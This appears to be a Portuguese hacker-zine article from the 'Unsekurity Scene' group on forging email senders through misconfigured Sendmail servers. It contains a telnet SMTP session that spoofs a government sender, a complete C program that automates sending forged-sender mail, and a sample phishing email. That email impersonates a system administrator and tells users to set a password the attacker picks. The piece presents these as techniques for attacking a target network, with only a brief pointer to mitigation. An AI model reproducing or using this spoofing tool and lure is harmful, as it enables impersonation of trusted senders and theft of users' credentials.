@@ -1,0 +1,294 @@
+##########################################################################
+########################## UNSEKURITY SCENE ##############################
+##########################################################################
+
+
+By Martin Fallon.
+mar_fallon@yahoo.com.br
+
+
+                *** ENVIO SIMPLES DE E-MAIL FALSO ***
+
+
+Quando o Marco Nunez foi preso, muitos especularam se ele havia realmente
+enviado um e-mail falso e como.Existem diversos metodos para se enviar
+um e-mail com endereco do remetente forjado, ou como conhecemos
+vulgarmente, um fake mail! Neste breve artigo eu irei expor um metodo
+simples e que requer algumas configuracoes "bugadas"(entre aspas) no
+servidor alvo, para que se possa enviar um fake mail usando o seu
+proprio Servidor SMTP, no caso, o poderoso MTA Bugmail(Sendmail).
+
+Enviar um fakemail via servidores sendmail mal configurados eh algo bem
+trivial.E nos podemos ver como se faz isso, seguindo os passos abaixo,
+onde eu enviarei um e-mail ao usuario "root" como se fosse o senhor,
+excelentissimo presidente da republica fhc@planalto.gov.br;
+
+Primeiramente, nos iremos dar um telnet para a porta 25 do servidor alvo,
+e toda a negociacao serah feita via /bin/telnet.                        
+
+darkstar:/# telnet alvo 25
+Trying XXX.XXX.XXX.X...
+Connected to X.
+Escape character is '^]'.
+220 XXX ESMTP Sendmail 8.9.3/8.9.3; Sun, 31 Dec 2000 22:26:22 -0300
+helo localhost.localhost
+250 XXX Hello localhost [127.0.0.1], pleased to meet you
+mail from: fhc@senado.gov.br
+250 fhc@senado.gov.br... Sender ok
+rcpt to: root@localhost
+250 root@localhost... Recipient ok
+data
+354 Enter mail, end with "." on a line by itself
+teste fake
+.
+250 WAA00163 Message accepted for delivery
+quit
+221 darkstar closing connection
+Connection closed by foreign host.
+
+
+Como voces podem ver na demonstracao acima, eh bem simples forjar e
+enviar um e-mail forjado.Basicamente seguimos os seguintes passos:
+
+1 - HELO servidor 
+2 - MAIL FROM: <endereco forjado>
+3 - RCPT TO: <usuario alvo> 
+4 - DATA para digitarmos nossa mensagem.
+5 - E . (ponto final numa unica linha) para indicarmos que terminamos
+    a mensagem.
+
+Como podemos ver, isto eh mesmo bem simples.E ficarah mais simples, aos
+irmaos NewBies que conhecem um pouco do hacking, com o programa abaixo:
+
+-------------------------------------------------------------------------
+/* PROGRAMA AUTOMATIZADOR DE ENVIO DE
+ * E-MAILS COM ENDERECO DE ORIGEM FORJADO.
+ * FEITO POR MARTIN FALLON EM 31.12.2000.
+ * mar_fallon@yahoo.com.br
+ * OBS: Existe um pequeno erro no codigo
+ *      para coibir acao de script kiddies.
+ * Agradecimentos a todos da Unsek Scene.
+ * http://unsekurity.virtualave.net/
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+#define  ERROR    -1 
+#define  PORT     25
+
+int Mensagem(int Socket);
+
+int main(int argc, char *argv[]){
+char Recv[1024], Send[1024];
+int Socket, R;
+struct hostent *host;
+struct sockaddr_in alvo;
+                              
+
+if(argc < 4){
+printf("Faker - Envia Mails Forjados!\n\n");
+printf("Uso: %s [host_alvo] [usuario_alvo] [rementente_forjado]\n\n",argv[0]);
+printf("Unsek Scene Rocks - http://unsekurity.virtualave.net/\n");
+exit(ERROR);
+}
+
+host = gethostbyname(argv[1]);
+if(host == NULL){
+fprintf(stderr,"Host Desconhecido!\n");
+exit(ERROR);
+}
+
+alvo.sin_family = host->h_addrtype;
+alvo.sin_port = htons(PORT);
+alvo.sin_addr = *((struct in_addr *)host->h_addr);
+bzero(&(alvo.sin_zero), 8);
+
+Socket = socket(AF_INET, SOCK_STREAM,0);
+if(Socket < 0){
+perror("Socket");
+exit(ERROR);
+}
+
+if(connect(Socket,(struct sockaddr * )&alvo, sizeof(alvo)) < 0){
+fprintf(stderr,"Erro em connect()!!\n");
+close(Socket);
+exit(ERROR);
+}
+
+bzero(Send, sizeof(Send));
+bzero(Recv, sizeof(Recv));
+snprintf(Send,1023,"HELO localhost.%s\n",argv[1]);
+write(Socket,Send,strlen(Send));
+if ((R = read(Socket, Recv, sizeof(Recv))) < 0){
+fprintf(stderr,"Sem Resposta!");
+close(Socket);
+exit(ERROR);
+}
+
+if(!strstr(Recv,"ok")){
+printf("1o. Passo Dado - Helo respondeu com OK!:)\n");
+}
+else{
+fprintf(stderr,"Problemas com HELO!\n");
+close(Socket);
+exit(ERROR);
+}
+
+bzero(Send, sizeof(Send));
+bzero(Recv, sizeof(Recv));
+snprintf(Send,1023,"MAIL FROM: %s\n",argv[3]);
+write(Socket,Send,strlen(Send));
+if ((R = read(Socket, Recv, sizeof(Recv))) < 0){
+fprintf(stderr,"Sem Resposta para MAIL FROM!\n");
+close(Socket);
+exit(ERROR);
+}
+
+if(!strstr(Recv,"ok")){
+printf("2o. Passo Dado - Mail From respondeu com OK!:)\n");
+}
+else{
+fprintf(stderr,"Problemas com Mail From!\n");
+close(Socket);
+exit(ERROR);
+}
+
+bzero(Send, sizeof(Send));
+bzero(Recv, sizeof(Recv));
+snprintf(Send,1023,"rcpt to: %s\n",argv[2]);
+write(Socket,Send,strlen(Send));
+if ((R = read(Socket, Recv, sizeof(Recv))) < 0){
+fprintf(stderr,"Sem Resposta para Rcpt to!\n");
+close(Socket);
+exit(ERROR);
+}
+
+if(!strstr(Recv,"Recipient ok")){
+printf("3o. Passo Dado - Rcpt To respondeu com OK!:)\n");
+}
+else {
+fprintf(stderr,"Problemas com RCPT TO!\n");
+close(Socket);
+exit(ERROR);
+}
+
+bzero(Send, sizeof(Send));
+bzero(Recv, sizeof(Recv));
+
+Mensagem(Socket);
+return 0;
+}
+
+/* Funcao Responsavel Pelo Envio Interativo da Mensagem */
+
+#define max(x,y) ((x)>(y)?(x):(y))
+
+int Mensagem(int Socket){
+char envia[4056], recebe[1024], buffer[4056];
+fd_set rset;
+int  R, maxfd;
+
+sleep(1);
+
+bzero(envia, sizeof(envia));
+bzero(recebe, sizeof(recebe));
+
+printf("Digite sua Mensagem\n");
+strcpy(envia,"DATA\n");
+write(Socket, envia, strlen(envia));
+if ((R = read(Socket, recebe, sizeof(recebe))) < 0){
+fprintf(stderr,"Problemas com DATA!\n");
+close(Socket);
+exit(ERROR);
+}
+if(!strstr(recebe,"Enter mail")){
+bzero(envia, sizeof(envia));
+bzero(recebe, sizeof(recebe));
+for (;;){
+    FD_SET(fileno(stdin), &rset);
+    FD_SET(Socket, &rset);
+    maxfd = max(fileno(stdin), Socket) + 1;
+    select(maxfd, &rset, NULL, NULL, NULL);
+    if (FD_ISSET(fileno(stdin), &rset)) {
+      bzero(envia, sizeof(envia));
+    while(!strstr(envia,"FIM")){ 
+    fgets(buffer, sizeof(envia) - 2, stdin);
+    strcat(envia,buffer);}
+    strcat(envia,"\n.\n");
+    write(Socket, envia, strlen(envia));
+   }
+    if (FD_ISSET(Socket, &rset))
+    {
+      bzero(recebe, sizeof(recebe));
+      if ((R = read(Socket, recebe, sizeof(recebe))) == 0){
+        printf("ok!\n");
+}
+}
+else
+      {
+        return (ERROR);
+      }
+    }
+}
+bzero(envia, sizeof(envia));
+bzero(recebe, sizeof(recebe));
+strcpy(envia,"QUIT");
+write(Socket, envia, strlen(envia));
+if ((R = read(Socket, recebe, sizeof(recebe))) < 0){
+fprintf(stderr,"Erro na Desconexao - Taca um Ctrl + C!\n");
+close(Socket);
+exit(ERROR);
+}
+
+printf("Fakemail Enviado com Sucesso!!\n");
+return 0;
+}
+
+------------------------------------------------------------------------
+
+O codigo acima automatiza os esquemas descritos, eh apenas um codigo
+inutil, jah que voce conhece a teoria e a pratica!:)
+
+O que podemos fazer de util com esta tecnica?
+
+Se existe um host alvo com a porta 25 nessas condicoes.E voce nao
+conseguiu exploitar o mesmo via as outras tecnicas, voce pode se passar
+pelo administrador de sistema e induzir um usuario a praticar uma acao.
+Enviando um e-mail com endereco forjado, podemos facilmente enganar um
+usuario da rede, vejamos o exemplo abaixo:
+
+Prezado usuario,
+
+venho atraves deste e-mail solicitar ao senhor que altere sua senha para
+AxDeFgH e que a mesma permaneca assim durante duas semanas.O motivo desta
+solicitacao, eh que a conta do senhor tem sido constantemente atacada,
+e por este motivo se faz necessario que o senhor sete esta senha para que
+o nosso sistema possa bloquear os ataques!
+
+Atenciosamente,
+
+Fulano de Tal
+Administrador da REDEALVO
+
+
+Como o e-mail acima vai parecer ter sido enviado pelo proprio administrador,
+dificilmente o usuario nao mudaria as configuracoes solicitadas!
+
+Esta eh mais uma simples tecnica fucadora conhecida em larga escala, mas
+que ainda tem milhares de servidores vulneraveis! No link abaixo, pode-se
+obter maiores informacoes de como diminuir este problema:
+
+http://www.orbs.org/
+
+Um [].
+
+Martin Fallon.
+
+
+
